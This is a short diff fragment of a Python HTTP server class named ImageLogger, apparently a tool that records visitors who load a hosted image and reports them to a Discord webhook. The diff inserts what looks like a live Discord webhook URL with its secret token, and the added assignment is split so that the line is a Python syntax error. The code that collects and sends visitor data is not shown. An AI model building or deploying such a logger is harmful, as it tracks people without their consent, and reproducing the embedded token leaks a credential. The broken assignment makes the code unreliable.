@@ -2,7 +2,8 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 import requests
 
 # Configuration
-WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"
+WEBHOOK_URL =
+"https://discord.com/api/webhooks/1335979504371499049/aftM-GJrac25vzJZDnwXsJ40OOvJUNfOous5qplstXtAIPCWm1zibfAKQv_PRa4sz43B"
 IMAGE_URL = "https://your-server.com/image.jpg"  # Your hosted image
 
 class ImageLogger(BaseHTTPRequestHandler):
